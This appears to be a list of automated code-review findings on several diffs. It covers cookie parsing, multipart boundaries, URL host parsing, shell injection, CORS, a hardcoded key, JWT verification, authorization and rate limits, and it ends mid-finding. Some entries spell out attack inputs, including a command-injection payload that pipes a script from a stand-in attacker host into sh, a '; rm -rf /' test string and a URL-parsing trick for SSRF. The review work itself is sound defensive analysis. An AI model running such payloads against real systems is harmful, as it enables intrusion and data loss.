In the new `HTTPRequest.cookies` property, the `except Exception` branch assigns `self._cookies = None`, so the property returns `None` whenever a client sends a `Cookie` header that `Cookie.SimpleCookie.load()` cannot parse. Every caller still treats the result as a mapping:

- `web.py:321` — `if name in self.request.cookies` raises `TypeError: argument of type 'NoneType' is not iterable`.
- `web.py:367` — `self.request.cookies.iterkeys()` raises `AttributeError: 'NoneType' object has no attribute 'iterkeys'`.

Since `get_cookie` underpins `get_secure_cookie`/XSRF handling, a single malformed (attacker-supplied) cookie header turns into a 500 for any handler that reads cookies. The old code never produced a non-mapping: it called `self.clear_all_cookies()` and left `_cookies` as an empty `SimpleCookie`.

Fix: assign an empty mapping instead, e.g. `self._cookies = {}` (or a fresh `Cookie.SimpleCookie()`), so the property's contract — "a dictionary of Cookie.Morsel objects" as the docstring on line 515 states — holds on the failure path too. Note also that moving this into `HTTPRequest` drops the old side effect of clearing the client's cookies; if that behaviour is still wanted it needs to live in `RequestHandler`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None -> unhandled 500

findings.title: No test covers cookies property behavior, including malformed-header path
findings.body: The new `cookies` property changes error handling from the old `web.py` version: on a malformed 'Cookie' header, it now sets `self._cookies = None` instead of falling back to an empty/cleared cookie jar. Callers in web.py (`get_cookie` at line 321, `clear_all_cookies` at line 367) use `self.request.cookies[name]` / `.iterkeys()` directly, which will raise (TypeError/AttributeError) if `cookies` is None. No test in this diff exercises the malformed-cookie path or verifies `get_cookie`/`clear_all_cookies` behave correctly after the move, so this behavior change would go undetected.

findings.title: Parameter name not stripped, so boundary is never matched
findings.body: `content_type.split(";")` yields parameters with the leading space that browsers/clients put after the separator: for `multipart/form-data; boundary=----abc` the second element is `" boundary=----abc"`, so `k` is `" boundary"` and the comparison `k == "boundary"` is False. The loop then falls through to the `else` clause and logs "Invalid multipart/form-data", discarding the body for essentially every real multipart upload. The previous code used `'boundary=' in content_type`, which was whitespace-insensitive, so this is a regression introduced by the fix. Strip the field before partitioning (e.g. `k, sep, v = field.strip().partition("=")`).

findings.title: New boundary-parsing branch (multi-field Content-Type) has no test
findings.body: The change reworks how the boundary parameter is extracted from a multipart/form-data Content-Type header, switching from a single split on 'boundary=' to splitting on ';' and matching field keys exactly against 'boundary'. This is exactly the kind of change where a header like 'multipart/form-data; boundary=xyz' (note the space after the semicolon) produces a key of ' boundary' (with leading space) via partition('='), which does not equal 'boundary', so the branch falls through to the for-else and logs 'Invalid multipart/form-data' instead of parsing the body. No test exercises this new code path with a realistic Content-Type header (with or without the leading space that real HTTP clients send), so this regression would pass silently.

findings.title: Quoted boundary value passed through with quotes intact
findings.body: RFC 2045 permits (and some clients emit) a quoted parameter value, e.g. `boundary="----abc"`. `partition("=")` returns `v` including the surrounding double quotes, and that raw string is handed to `_parse_mime_body`, which will then look for `--\"----abc\"` delimiters and fail to split the parts. Since this hunk is already normalising parameter parsing, strip a matching pair of quotes from `v` before use.

findings.title: Error message has format placeholder with no argument
findings.body: Line 100 raises a `LocationParseError` with the message "Failed to parse: %s", but no value is provided to fill the `%s` placeholder. This will result in the literal string "Failed to parse: %s" being shown to users instead of the actual URL that failed to parse. The `url` parameter should be interpolated into the message so callers understand which URL caused the error.

findings.title: get_host's invalid-port branch is untested
findings.body: The diff adds get_host, including a branch that raises LocationParseError when the port isn't numeric (`if not port.isdigit(): raise LocationParseError("Failed to parse: %s")`). No test file accompanies this module, so nothing exercises this branch. As a result, a broken exception message (missing %-format argument, which would raise TypeError on formatting or produce a garbled message) went in undetected and would continue to go undetected on any regression. Add a test that calls get_host with a malformed port and asserts the exception type/message.

findings.title: get_host authority parsing diverges from urlparse on '?' and '#'
findings.body:
`get_host` ends the authority component only at the first `/` (line 92-93) before stripping userinfo (line 94-95). RFC 3986 ends the authority at the first of `/`, `?` or `#`. For `http://good.com?@evil.com/` this function strips at `/`, then splits on `@`, and returns host `evil.com`, while `urlparse`/`urlsplit` returns `good.com`. Any caller that validates a user-supplied URL with the stdlib parser (allowlist / SSRF guard) and then hands the same string to urllib3 will connect to a different host than the one it approved. Same class of divergence applies to `#`, and to multiple `@` (line 95 uses `split('@', 1)` where the RFC-correct behaviour is to split on the *last* `@` within the authority).

The helper is being moved, not written, so this is pre-existing behaviour — but since the module is now the single public parsing entry point, it is worth either delegating to `urlsplit` or terminating the authority at `[/?#]` and using `rpartition('@')`.

findings.title: LocationParseError message has an uninterpolated %s placeholder
findings.body: `raise LocationParseError("Failed to parse: %s")` passes the literal string, so callers and logs see `Failed to parse: %s` rather than the offending URL. Since this is the only signal the caller gets about *which* URL had a non-numeric port, the error is effectively undiagnosable. Interpolate the value, e.g. `raise LocationParseError("Failed to parse: %s" % url)` (or the original full url, which is arguably more useful since `url` has been progressively stripped of scheme/path/auth by lines 90-97).

findings.title: Documentation disagrees with implementation of HTTPMove.location
findings.body: The public attribute `HTTPMove.location` is documented in docs/web_reference.rst as 'the string it was constructed with' and states that 'Application code compares it against configured strings and passes it to str.startswith'. However, this diff changes the attribute to store a URL object instead of a string. Existing code relying on the documented behavior (string comparisons, str.startswith calls) will break. Either revert this change, update the implementation to store the string, or update the documentation if URL objects are the intended design.

findings.title: `HTTPMove.location` changes from str to URL, breaking callers
findings.body:
`self.location` is now assigned `URL(location)` rather than the `location` argument. The documented contract (docs/web_reference.rst) states this attribute is "the location the response redirects to, **as the string it was constructed with**", and that application code compares it against configured strings and passes it to `str.startswith`.

Two concrete breakages follow:

- `exc.location.startswith("/admin")` raises `AttributeError`, since `yarl.URL` has no `startswith`.
- `exc.location == "/admin"` silently evaluates to `False` — a `URL` does not compare equal to a `str` — so equality-based redirect checks fail without any error, which is the worse of the two failure modes.

Keep the public attribute as the original value and build the header separately, e.g. `self.location = location` and `self.headers['Location'] = str(URL(location))` (the pre-change form). If a parsed URL is genuinely wanted, expose it under a new name so the existing attribute's type is preserved.

findings.title: No test guards `self.location` type/value against this regression
findings.body: `self.location` is now assigned `URL(location)` instead of the original string, reversing documented behavior (docs/web_reference.rst states location is kept 'as the string it was constructed with'). If a test existed asserting `isinstance(exc.location, str)` or `exc.location == some_string` / `exc.location.startswith(...)`, it would have failed on this change. Since no such test is present in the diff or apparently in the suite, this behavior change can silently break application code that does `str.startswith` or string equality on `.location`.

findings.title: location becomes URL object, silently breaking redirect allowlist checks
findings.body:
`self.location` used to be the exact string passed in; it is now a `yarl.URL`. The retrieved documentation states that application code compares this attribute against configured strings and calls `str.startswith` on it. After this change:

- `resp.location.startswith("https://trusted.example/")` raises `AttributeError` (a crash, but at least loud), and
- `resp.location == "https://trusted.example/next"` now evaluates to `False` for every string, so any guard shaped like `if resp.location not in ALLOWED: reject()` silently stops matching — and any guard shaped like `if resp.location in DENYLIST: reject()` silently stops rejecting.

Where the redirect target originates from a request parameter (a `?next=`-style flow is the common case for `HTTPFound`), the second shape turns into an open redirect: the check passes, and the `Location` header on line 9 still carries the attacker's target. Additionally `URL()` normalises its input, so even `str(resp.location)` is not guaranteed to equal what the caller passed.

If the URL object is wanted, expose it under a new name (e.g. `location_url`) and leave `location` as the string the caller supplied, as documented.

findings.title: Single `if` before `_wait` can make readany return b"" spuriously
findings.body:
`_wait()`'s own docstring states the waiter "is also resolved at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived." Replacing the `while` loop with an `if` removes exactly that re-check: after a single wake with an empty buffer and no EOF, control falls through to `self._read_nowait(-1)`, which returns an empty bytes object. Callers of `readany()` treat `b""` as end-of-stream, so this silently truncates responses instead of blocking until data or EOF actually arrives. Restore the `while` loop (or re-check `self._buffer`/`self._eof` after `_wait` returns).

_Also raised by the security agent:_ Single `if` can return empty chunk, silently truncating stream data

findings.title: No test covers spurious wakeup causing empty read
findings.body: The change replaces a while-loop with a single if, so after `_wait('readany')` resolves without new data (as the docstring for `_wait` explicitly warns can happen), `readany` will return early via `_read_nowait(-1)` with an empty/incomplete result instead of re-checking and waiting again. No test in this PR exercises a wakeup that occurs without data arriving, so this regression would pass CI silently.

findings.title: Implicit relative import breaks module import on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328), so importing `requests.sessions` will raise `ModuleNotFoundError: No module named 'adapters'` unless a top-level `adapters` module happens to be on `sys.path` — in which case the wrong module is imported silently. Since `requests/__init__.py` almost certainly imports `sessions`, this breaks importing the package at all. Restore `from .adapters import HTTPAdapter`.

findings.title: Implicit import of `adapters` allows sys.path module shadowing
findings.body:
`from adapters import HTTPAdapter` no longer binds the import to this package. Under Python 3 (and under Python 2 once `absolute_import` is in effect) this is an absolute import resolved against `sys.path`, whose first entry is the invoking script's directory — and in some embedded/CLI invocations the current working directory. Any `adapters.py` or `adapters/` earlier on `sys.path` than the `requests` package will be imported and executed instead of `requests/adapters.py`, meaning whoever controls that directory controls the `HTTPAdapter` used for every outbound HTTP request (TLS verification, proxying, redirect handling). Restore the explicit relative form `from .adapters import HTTPAdapter` so resolution is anchored to the package regardless of `sys.path`.

I cannot name an attacker-controlled entry point from this diff: the exposure depends on whether an untrusted directory can appear on `sys.path` ahead of the package in a given deployment, which is not visible here. The primary consequence is likely an outright `ImportError` on Python 3; the shadowing risk is the security-relevant tail.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
`HTTPRequest.cookies` is documented (and implemented) to return `None` when the Cookie header is present but cannot be parsed: "Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that." With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable` on any request carrying a malformed Cookie header — an attacker- or client-controlled input, turning a benign header into a 500 on every handler that reads a cookie (including secure-cookie/XSRF paths built on `get_cookie`).

Restore the guard:

```python
if self.request.cookies is not None and name in self.request.cookies:
```

(or normalise `cookies` to an empty dict at the source, but that changes the documented contract for all other consumers).

findings.title: Removed None guard lets a malformed Cookie header crash any handler
findings.body:
`RequestHandler.get_cookie` now does `name in self.request.cookies` with no `None` check. The retrieved `tornado/httpserver.py` cookies property explicitly returns `None` when the Cookie header is present but cannot be parsed, and its docstring states "every consumer has to allow for that". `name in None` raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled and unauthenticated. Sink: line 3 of `get_cookie`, reached by every handler that reads a cookie — including `get_secure_cookie` and XSRF token handling — so a single garbage Cookie header turns any cookie-reading endpoint into an unhandled 500. It is trivially repeatable and needs no session or credentials, so it is a cheap remote availability/error-flood vector and a source of noisy stack traces in logs.

Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:`, or have the producer return an empty container instead of `None` if the intent is to simplify consumers.

findings.title: No test exercises get_cookie with cookies=None
findings.body: The change removes the `self.request.cookies is not None` guard in `get_cookie`, restoring the crash path documented in httpserver.py's cookies property ("Set to None when the Cookie header is present but cannot be parsed"). Since `name in None` raises TypeError, a request with a malformed Cookie header will now raise instead of falling back to `default`. No test in this PR calls `get_cookie` with a request whose `cookies` property is None, so this regression would pass CI silently.

findings.title: Dropping .strip() breaks boundary detection for multipart bodies
findings.body:
`content_type.split(";")` on a typical header such as `multipart/form-data; boundary=----abc` yields `["multipart/form-data", " boundary=----abc"]`. The second element keeps the leading space that follows the semicolon, so after `field.partition("=")` the key is `" boundary"`, which fails the `k == "boundary"` test on line 5. `_parse_mime_body` is then never called and the form fields/files are silently dropped — no exception, just an empty arguments dict for every well-formed request that puts a space after the semicolon (i.e. essentially every browser and HTTP client).

Restore the strip: `k, sep, v = field.strip().partition("=")`. Note the value side also loses its trailing-whitespace normalisation, so a boundary would be corrupted even if the key happened to match.

findings.title: Dropping .strip() silently skips multipart body parsing
findings.body:
`content_type` (attacker/client-supplied `Content-Type` request header) is split on `;`, and each parameter is now matched without trimming surrounding whitespace. For the near-universal form `multipart/form-data; boundary=----WebKitFormBoundaryXyz`, the second field is `" boundary=----..."`, so `k` is `" boundary"` and the `k == "boundary"` test on line 5 fails. `_parse_mime_body` on line 6 is never reached, the loop ends, and the request body is dropped with no error raised to the caller.

Two consequences: (1) every multipart upload/form silently yields empty `request.arguments`/`request.files`, which downstream handlers may interpret as "no file supplied" rather than "malformed request"; (2) it introduces a parsing differential — a fronting proxy, WAF or request-logging layer that parses the same body per RFC 7231 (which explicitly permits OWS around parameters) will see fields that Tornado does not, so content-based filtering on multipart parts can be evaded while the application still sees the raw body via other paths. Restore `field.strip().partition("=")`, or better, normalise with `k.strip().lower()` and strip the value's surrounding whitespace/quotes.

findings.title: No test covers boundary parsing with leading whitespace
findings.body: The change removes field.strip() before partition("="), which means a content-type header like 'multipart/form-data; boundary=xyz' (with a space after the semicolon, which is extremely common) will no longer match 'boundary' as the key, since k would be ' boundary' instead of 'boundary'. This silently breaks multipart form parsing. No test in this diff exercises this parsing path with a realistic space-separated content-type header, so this regression would not be caught by any test suite.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: `"Failed to parse: %s"` is now raised without applying `% url`, so the exception message literally contains `%s` instead of the offending URL. Callers and logs that surface this error lose the only piece of diagnostic information it carried, and any test asserting on the message text (e.g. matching the URL) will fail. Restore the argument: `raise LocationParseError("Failed to parse: %s" % url)`.

findings.title: No test exercises the invalid-port error message/type
findings.body: The changed line removes the argument to the %s placeholder, so LocationParseError("Failed to parse: %s") will itself raise a TypeError when constructed (since % s has no substitution value), rather than raising LocationParseError with a useful message. No test in this diff calls the parsing function with a malformed port to assert either the exception type raised or the message content, so this regression would not be caught by any test run as part of this change.

findings.title: Command injection via shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a command string and executes it with `shell=True`. Neither argument is quoted, escaped, or validated, so any shell metacharacter in either value is interpreted by `/bin/sh`. A `name` of `x; curl attacker.tld/s | sh #` or `` x`id` `` gives arbitrary command execution as the process user; the same holds for `directory`.

Fix by dropping the shell and passing an argument list, exactly as the existing `list_exports` on line 5 already does:

    subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)

That removes the interpreter, but it does not remove the second problem: `name` is still interpolated into a filesystem path, so `../../etc/cron.d/foo` would write outside `/exports`. Validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9_-]{1,64}$`) before using it, and resolve the final path to confirm it stays under `/exports`.

findings.title: Unquoted interpolation into shell command breaks on ordinary names
findings.body:
`cmd = f"tar -czf /exports/{name}.tar.gz {directory}"` is passed to `subprocess.run(..., shell=True)`, so the shell word-splits the interpolated values. A perfectly legitimate `name` like `"Q3 report"` produces `tar -czf /exports/Q3 report.tar.gz <dir>`, which tars the wrong file set into `/exports/Q3` and then treats `report.tar.gz` as an input path — `check=True` will either raise on a nonexistent path or silently produce a mis-named archive. The same applies to any `directory` containing a space. Shell metacharacters (`;`, `&&`, backticks, `$(...)`) in either argument are executed as commands rather than being treated as literal text, which is the same defect taken to its conclusion.

The module already has the correct pattern one function above: `subprocess.run(["ls", directory], ...)` on line 5. Do the same here — build an argument list and drop `shell=True`:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

Note that even with a list, `name` still lands inside a path, so it should be validated (or `os.path.basename`'d) to stop `../` from escaping `/exports`.

findings.title: No test exercises create_archive's command construction
findings.body: create_archive builds a shell command string via f-string interpolation and runs it with shell=True. Nothing in this diff or the visible repo tests this function, so a change that broke quoting/escaping (or reintroduced/altered the injection-prone interpolation) would go undetected. Add a test that calls create_archive with a name containing shell metacharacters (e.g. '; rm -rf /', spaces, or quotes) and asserts on the resulting command/behavior, ideally using a fake subprocess.run to capture the exact command string executed.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, in a file whose existing export deliberately restricts access to the `ALLOWED` list (line 6). Any route mounted with `dashboardCors` no longer has origin-based protection: an attacker-controlled page can issue cross-origin requests and read the responses, and with credentials enabled those requests carry the victim's session cookies or `Authorization` header — a cross-site request forgery / cross-origin data read against the dashboard API.

Note on mechanics: if this is the `cors` npm package, `origin: "*"` emits the literal `Access-Control-Allow-Origin: *`, which browsers refuse to honour on credentialed requests, so the immediate effect may be that the dashboard simply breaks rather than being exploitable. That is not a safe place to leave it — the usual next step is to switch to origin reflection (`origin: true` or an echo of `req.headers.origin`), at which point the configuration becomes fully exploitable with no further review.

Fix: keep the dashboard on an explicit allowlist (extend `ALLOWED` with the dashboard's origin) rather than introducing a wildcard middleware. If a truly public endpoint is needed, drop `credentials: true`.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*" })` emits the literal header `Access-Control-Allow-Origin: *`. Per the Fetch/CORS spec, a browser fails any request made with `credentials: "include"` (or `withCredentials`) when the allow-origin header is the wildcard, regardless of `Access-Control-Allow-Credentials: true`. So this middleware does not achieve what it is evidently trying to achieve: the dashboard's cookie/auth-bearing requests will be blocked by the browser and the endpoints will look broken, while non-credentialed cross-origin reads become open to every site.

If the dashboard genuinely needs credentials, the origin must be reflected from an allowlist, e.g. `origin: (o, cb) => cb(null, DASHBOARD_ORIGINS.includes(o))` (the `cors` package then echoes the request origin and adds `Vary: Origin`). If credentials are not needed, drop `credentials: true` so the wildcard is actually usable.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal string whose prefix (`acme_live_`) marks it as a production credential, and it is assigned directly to `acmepay.api_key` in `client()`. The previous code read it from `os.environ["ACMEPAY_SECRET_KEY"]`, so this change removes the control that kept the credential out of the repository.

Anyone with read access to the repo — plus anyone who later gets a clone, a CI log, a fork, or the git history after a revert — obtains a live payments credential. Reverting the commit does not help; the value stays in history.

Actions: (1) treat this key as compromised and rotate it at AcmePay immediately; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secret-manager fetch) and delete the literal; (3) purge the value from git history and add a secret scanner / pre-commit hook so this cannot land again.

findings.title: Production credential hardcoded without warning.
findings.body: The constant `ACMEPAY_SECRET_KEY` on line 4 holds a production API key (`acme_live_...` prefix indicates live/production mode). This is a live credential committed to source control. The absence of any warning comment, docstring, or naming convention makes it indistinguishable from a test fixture constant and actively conceals its sensitivity from reviewers and maintainers reading the code. Add an explicit comment or docstring clarifying its nature, or (preferably) remove the hardcoded credential entirely and restore environment variable loading.

findings.title: Environment-based key selection removed; live key used everywhere
findings.body: `client()` previously resolved the API key from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment (local, CI, staging, production) supplied its own key. After this change the module-level constant is the only source, and the value is prefixed `acme_live_`. Any environment that was configured with a test key now transparently talks to the live payment provider — CI runs and staging traffic become real charges, and the previous fail-fast behaviour (a `KeyError` when the variable was unset) is gone, so a misconfiguration no longer surfaces at all. Restore the environment lookup (optionally with an explicit default or a clear startup error) rather than baking a single key into the module.

findings.title: client() behavior change has no test verifying api_key assignment
findings.body: client() was changed to source acmepay.api_key from a hardcoded module-level constant instead of an environment variable. The only test-related file touched in this PR (tests/fixtures/acmepay.py) is a fixture with no assertions—it defines fake_client() and TEST_KEY but nothing calls client() or asserts acmepay.api_key is set correctly. If this wiring were broken (e.g. wrong variable, key not applied), nothing here would fail.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(token, options={"verify_signature": False})` and returns `unverified["tenant_id"]`. A JWT is supplied by the client (Authorization header / cookie), so with verification off an attacker can mint or edit a token locally \u2014 flip the `tenant_id` claim to any value, no key needed \u2014 and whatever this function feeds (data scoping, row filters, config lookup) will operate against another tenant. Note that `claims_for()` two lines above already does it correctly with `public_key()` and `algorithms=["RS256"]`, so this is a deliberate weakening of an existing control, not a missing one.

Fix: verify the signature here too. If the concern is the cost of the key lookup, cache `public_key()` rather than skipping verification \u2014 e.g. `return claims_for(token)["tenant_id"]`. If the tenant id is genuinely needed *before* the key can be resolved (multi-tenant key selection), the unverified read must be used only to pick the key, and the claim used afterwards must come from the verified decode; it must never be the value returned to callers. Also consider `.get("tenant_id")` or an explicit error, since a token lacking the claim currently raises a bare `KeyError`.

findings.title: tenant_of trusts an unverified, unexpired-unchecked token
findings.body: With `verify_signature: False`, PyJWT also disables the dependent claim checks (`exp`, `nbf`, `aud`, `iss`) by default, so `tenant_of` returns a tenant id from a token that may be expired, revoked in spirit, or entirely attacker-authored. Any caller that uses this return value to scope a query or an authorization decision gets cross-tenant access for free. This function disagrees with `claims_for` on line 7, which does verify — two functions on the same token now yield different trust levels, and a reader cannot tell from the call site which one was used. Derive the tenant from `claims_for(token)["tenant_id"]` instead; if the key lookup is the cost being avoided, cache `public_key()` rather than skipping verification.

findings.title: New tenant_of() function has no test coverage
findings.body: tenant_of() decodes the JWT with signature verification disabled and returns the tenant_id claim unchecked. There is no test in this diff exercising this function — e.g. verifying it raises/rejects malformed tokens, handles missing tenant_id, or documenting the intended (unsafe) trust boundary. If the decode options or claim key were changed incorrectly, nothing would fail.

findings.title: Public function `tenant_of` lacks documentation of security model
findings.body: The function `tenant_of` is a public API that deliberately disables JWT signature verification. A caller needs to understand: (1) why verification is skipped, (2) when it is safe to call this instead of `claims_for`, and (3) what guarantees it does or does not provide about the token's authenticity. Without this, a competent caller could misuse it — for example, by relying on the tenant_id for authorization decisions when the token is unverified, or by calling it in a context where verification is mandatory.

findings.title: Missing ownership check lets any user edit another user's payment method
findings.body:
`update_payment_method` takes `pm_id` from the request, fetches the object with `PaymentMethod.get(pm_id)` (line 12) and immediately writes `body["billing_name"]` and persists it (lines 13-14). No authorisation check runs between the load and the write. `current_user(request)` on line 11 only authenticates — the retrieved `api/auth.py` docstring says so explicitly ("Authentication only — never authorisation") — and the resulting `user` value is never used, which is the tell that the check was omitted rather than deliberately skipped.

Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on payment methods belonging to other accounts. The read handler two lines above (line 6) does the right thing, so the fix is to mirror it:

```python
user = current_user(request)
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
pm.billing_name = body["billing_name"]
```

Alternatively scope the load itself to the caller (`PaymentMethod.get(pm_id, user_id=user.id)`) so the unauthorised object never materialises.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unguarded PaymentMethod.get result and unchecked body key

findings.title: Public mutation endpoint lacks documented ownership authorization
findings.body: The `update_payment_method` function mutates a PaymentMethod object without checking ownership. The repository convention states 'Every object mutation must call this' (referring to `require_owner`), but this is not documented in the function. A caller reading the function signature and available imports would have no way to know they need to pass an authorized user before calling it, nor any indication that the function silently allows unauthorized mutations. This is a public API contract violation — the function should either enforce `require_owner` as the docstring on `require_owner` guarantees all mutations do, or document explicitly why this mutation is an exception.

findings.title: No test covers authorization on update_payment_method
findings.body: update_payment_method mutates a payment method loaded solely by pm_id, without calling require_owner (unlike get_payment_method above it, which does call it on line 6). There is no test in this diff exercising this new endpoint at all, so a test that would catch a user updating another user's payment method — e.g. asserting Forbidden is raised for a non-owner — does not exist and nothing would fail if this authorization gap were introduced or persists.

findings.title: Rate limit removed from password reset endpoint
findings.body:
`request_reset` was previously protected by `@rate_limit("5/hour")`; the decorator and its `from limits import rate_limit` import are both deleted, so the handler now calls `send_reset_email(email)` on every request with no throttle. An unauthenticated caller controls `email` and can loop the endpoint to (a) mail-bomb an arbitrary victim address, (b) burn the sending domain's reputation/quota, and (c) enumerate or spray reset tokens if tokens are short-lived-but-guessable. Restore the decorator, or move the limit into shared middleware and note that here so the protection is provably still applied.

I cannot see the routing layer or any middleware in this diff or in retrieved context, so if the limit was deliberately relocated to a gateway this is a no-op — that is the one assumption behind the confidence rating rather than 1.0. Severity is `major`, not `critical`: nothing here grants access, it only makes abuse free.

findings.title: No test guards rate limiting on password reset endpoint
findings.body: The decorator enforcing a 5/hour rate limit on request_reset was removed, and no test in this diff (or apparently in the surrounding suite) asserts that repeated calls to request_reset are throttled. Without such a test, this regression — or any future reintroduction of it — would go undetected. Add a test that calls request_reset repeatedly and asserts that requests beyond the limit are rejected/throttled.

findings.title: read_export_preview joins name without _confined containment check
findings.body:
`read_export_preview` builds its path with a bare `os.path.join(EXPORT_ROOT, name)`, while the sibling reader on line 14 routes the same caller-supplied `name` through `_confined(name)` first.
